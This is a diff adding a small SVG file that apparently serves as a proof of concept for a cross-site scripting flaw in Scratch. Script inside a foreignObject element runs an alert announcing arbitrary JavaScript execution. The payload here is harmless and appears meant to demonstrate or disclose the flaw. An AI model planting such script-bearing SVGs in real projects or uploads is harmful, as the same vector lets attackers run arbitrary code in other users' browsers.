@@ -1,0 +1,7 @@
+<svg xmlns="http://www.w3.org/2000/svg">
+<foreignObject>
+  <script>
+    alert("Hello there! This alert was shown to you via an exploit in Scratch that allows for arbitrary JavaScript execution via SVGs.");
+  </script>
+</foreignObject>
+</svg>
